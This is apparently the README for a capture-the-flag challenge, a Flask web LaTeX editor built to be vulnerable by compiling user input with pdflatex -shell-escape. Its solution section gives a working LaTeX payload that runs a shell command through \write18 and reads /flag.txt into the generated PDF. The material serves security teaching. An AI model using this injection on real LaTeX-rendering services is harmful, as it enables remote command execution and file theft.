# My Favourite Reporting Engine

Challenge Author: yappare

This repository contains a deliberately vulnerable web service for a CTF challenge that demonstrates **LaTeX injection leading to remote command execution** through `pdflatex` with `-shell-escape` enabled.

## What it is
- A simple Flask app with a web LaTeX editor (pink-beige theme).
- User-submitted LaTeX is written to a temporary folder and compiled with `pdflatex -shell-escape`.
- Compilation logs and the generated PDF are returned to the user.
- The flag is stored at `/flag.txt` inside the container.

## Goal for players
Exploit LaTeX injection to read `/flag.txt` and retrieve the flag. The web UI returns the PDF and compilation logs which can be used to exfiltrate data.

## How to run (local / test)
Build and run with Docker (recommended):
```bash
docker-compose up --build
```
Open http://localhost:5000

## Solution

A working LaTeX payload to exfiltrate the flag into the generated PDF is:

```tex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\immediate\write18{cat /flag.txt > /tmp/flag.txt}
\verbatiminput{/tmp/flag.txt}
\end{document}
```

Explanation:
1. `\immediate\write18{...}` executes the shell command (enabled by `-shell-escape`) which copies `/flag.txt` to a world-readable temporary file inside the container.
2. `\verbatiminput{...}` reads that file into the LaTeX document so the produced PDF contains the flag text. You can then download/open the PDF to read the flag, or look at compilation logs if configured to show file contents.
